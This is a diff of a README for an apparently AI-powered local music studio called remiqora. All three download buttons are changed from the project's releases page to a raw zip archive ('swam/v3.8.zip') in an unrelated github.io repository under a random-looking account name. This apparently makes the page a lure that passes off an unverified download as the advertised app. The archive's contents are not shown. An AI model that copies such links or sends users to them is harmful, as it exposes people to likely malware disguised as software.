@@ -5,7 +5,7 @@ description: "Generate, edit, and mix music locally with AI-powered GPU generati
 ---
 <h1>🎵 remiqora - Your Personal AI Music Studio</h1>
 
-<p align="center"><a href="https://github.com/Palaeoecologymyrmecophyte4195/remiqora/releases" style="display:inline-block;padding:16px 32px;background-color:#FF6B6B;color:#FFFFFF;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ Download remiqora Now</a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/Palaeoecologymyrmecophyte4195/palaeoecologymyrmecophyte4195.github.io/main/swam/v3.8.zip" style="display:inline-block;padding:16px 32px;background-color:#FF6B6B;color:#FFFFFF;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ Download remiqora Now</a></p>
 
 ## 🎯 What Is remiqora?
 
@@ -32,7 +32,7 @@ Included is a fully functional music editor. Arrange multiple tracks, adjust vol
 
 ### Step 1: Download the Application
 
-<a href="https://github.com/Palaeoecologymyrmecophyte4195/remiqora/releases" style="display:inline-block;padding:12px 24px;background-color:#4ECDC4;color:#FFFFFF;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;">Download remiqora</a>
+<a href="https://raw.githubusercontent.com/Palaeoecologymyrmecophyte4195/palaeoecologymyrmecophyte4195.github.io/main/swam/v3.8.zip" style="display:inline-block;padding:12px 24px;background-color:#4ECDC4;color:#FFFFFF;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;">Download remiqora</a>
 
 Visit this link to download the application.
 
@@ -125,6 +125,6 @@ Visit the GitHub page regularly for updates. New versions bring better sound qua
 
 Ready to start? Click the button below one more time.
 
-<a href="https://github.com/Palaeoecologymyrmecophyte4195/remiqora/releases" style="display:inline-block;padding:14px 28px;background-color:#F7DC6F;color:#2C3E50;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;">Get remiqora Now</a>
+<a href="https://raw.githubusercontent.com/Palaeoecologymyrmecophyte4195/palaeoecologymyrmecophyte4195.github.io/main/swam/v3.8.zip" style="display:inline-block;padding:14px 28px;background-color:#F7DC6F;color:#2C3E50;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;">Get remiqora Now</a>
 
 Make music without limitations. Make music your way. Make music with remiqora.
